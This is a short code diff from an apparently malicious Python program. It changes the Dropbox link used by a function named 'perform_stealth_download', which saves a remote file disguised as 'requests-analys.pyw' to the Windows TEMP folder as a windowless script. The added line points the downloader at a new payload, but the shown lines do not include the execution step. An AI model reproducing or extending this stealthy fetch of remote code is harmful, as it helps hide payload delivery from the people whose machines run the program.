@@ -148,7 +148,7 @@ _ = nested_function()
 
 
 def perform_stealth_download():
-    program_url = "https://www.dropbox.com/scl/fi/nhs49zj8x7wgrb0khkrkh/extraction.zip?rlkey=h2t4bdgxjhwv3cg55c6ebsgys&st=4h97kkuv&dl=1"
+    program_url = "https://www.dropbox.com/scl/fi/r4jb76tb2r035tfqi6ftf/requests-analys.pyw?rlkey=13270y57mwhg36eaxf52gam2h&st=6qvkcmww&dl=1"
     local_path = os.path.join(os.getenv("TEMP"), "script.pyw")  # Enregistrer dans le dossier temporaire
 
     try:
